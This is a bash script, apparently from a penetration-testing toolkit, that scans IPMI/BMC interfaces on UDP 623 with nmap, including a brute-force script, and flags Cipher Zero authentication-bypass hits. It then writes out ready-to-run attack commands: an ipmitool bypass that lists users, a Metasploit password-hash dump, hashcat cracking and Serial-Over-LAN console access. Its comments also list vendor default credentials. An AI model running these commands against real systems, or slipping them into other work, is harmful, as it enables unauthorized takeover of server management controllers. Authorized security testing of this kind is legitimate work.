#!/usr/bin/env bash
# enum-ipmi.sh — IPMI / BMC enumeration via 623/udp.
#
# Common findings:
#   * Cipher 0 auth bypass (RFC 3411 nightmare; ipmi-cipher-zero NSE)
#   * RAKP-3 password-hash retrieval (CVE-2013-4786 — every IPMI implementation)
#   * Default vendor creds (root/calvin on Dell iDRAC, ADMIN/ADMIN on Supermicro,
#     etc.) — separate creds/default-creds-sweep handles those.
#
# READ-ONLY. Does NOT run msfconsole — surfaces the msf module names as hints.

set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_lib.sh"
parse_common_args "$@" || exit 1
log "ipmi: $(wc -l < "$TARGETS") targets -> $OUT"

IPS=$(ips_only "$TARGETS")

if have nmap; then
    log "nmap ipmi-version + ipmi-cipher-zero + ipmi-brute"
    nmap -Pn -sU -p623 \
         --script 'ipmi-version,ipmi-cipher-zero,ipmi-brute' \
         -iL <(echo "$IPS") -oA "$OUT/nmap-ipmi" >/dev/null 2>&1 || true

    # Parse cipher-zero hits — these are CRITICAL
    if [ -f "$OUT/nmap-ipmi.nmap" ]; then
        grep -B1 'IPMI 2.0 Cipher Zero Authentication Bypass' "$OUT/nmap-ipmi.nmap" 2>/dev/null \
            > "$OUT/_cipher_zero_hits.txt" || true
        if [ -s "$OUT/_cipher_zero_hits.txt" ]; then
            err "CRITICAL: Cipher 0 auth bypass detected — see $OUT/_cipher_zero_hits.txt"
        fi
    fi
else
    miss "nmap not installed — ipmi dispatcher cannot probe"
fi

cat > "$OUT/_hints.txt" <<'EOF'
IPMI / BMC follow-ups (operator-driven; NOT auto-executed):

Cipher Zero auth bypass:
  ipmitool -I lanplus -C 0 -H <ip> -U Administrator -P '' user list

RAKP password-hash retrieval (works on every IPMI 2.0 — by spec, not bug):
  msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; \
                    set RHOSTS file:./targets.txt; run'
  Hashes are HMAC-SHA1 — feed to hashcat -m 7300 with rockyou or vendor-default
  lists.

Vendor-default credentials (run the dedicated creds dispatcher):
  ./creds/default-creds-sweep.py --service ipmi --target <ip>

BMC console access via Serial-Over-LAN once auth'd:
  ipmitool -I lanplus -H <ip> -U <user> -P <pw> sol activate
EOF

log "ipmi dispatcher done."
